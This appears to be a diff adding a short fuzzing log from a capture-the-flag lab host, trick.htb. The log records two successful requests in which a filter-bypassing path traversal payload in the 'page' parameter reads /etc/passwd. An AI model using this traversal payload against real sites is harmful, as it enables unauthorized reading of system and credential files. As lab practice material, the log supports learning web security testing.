@@ -1,0 +1,12 @@
+Target: http://preprod-marketing.trick.htb/index.php?page=FUZZ
+Total requests: 70466
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+04790:  C=200     41 L	      68 W	   2351 Ch	  "/..././..././..././..././..././..././..././..././etc/passwd"
+12828:  C=200     41 L	      68 W	   2351 Ch	  "/..././..././..././..././..././..././..././..././etc/passwd"
+
+Total time: 0
+Processed Requests: 19977
+Filtered Requests: 19975
+Requests/sec.: 0
